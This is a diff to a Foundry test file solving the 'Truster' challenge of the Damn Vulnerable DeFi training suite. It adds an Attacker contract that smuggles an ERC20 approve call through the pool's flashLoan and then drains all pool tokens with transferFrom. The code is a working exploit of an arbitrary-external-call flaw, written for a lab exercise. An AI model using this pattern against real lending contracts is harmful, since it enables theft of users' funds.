@@ -6,6 +6,39 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract Attacker {
+    TrusterLenderPool private pool;
+    address private recovery;
+    DamnValuableToken private token;
+    uint256 private TOKENS_IN_POOL;
+
+    constructor(
+        TrusterLenderPool _pool,
+        address _recovery,
+        DamnValuableToken _token,
+        uint256 _TOKENS_IN_POOL
+    ) {
+        pool = _pool;
+        recovery = _recovery;
+        token = _token;
+        TOKENS_IN_POOL = _TOKENS_IN_POOL;
+    }
+
+    function attack() external {
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            TOKENS_IN_POOL
+        );
+        pool.flashLoan(0, address(this), address(token), data);
+
+        
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+    }
+}
+
+
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -51,18 +84,11 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        // Encode the approve call to allow player to spend all pool tokens
-        bytes memory data = abi.encodeWithSignature(
-            "approve(address,uint256)",
-            player,
-            TOKENS_IN_POOL
-        );
+        //NOTE (tina): Attacker contract is defined above this test contract
+        Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
+        attacker.attack();
 
-        // Use flash loan to execute the approve call on the token contract
-        pool.flashLoan(0, player, address(token), data);
-
-        // Now transfer all tokens from pool to recovery
-        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+        //this is why the exploit works: 'target' can be any address and we can call any function on it
     }
 
     /**
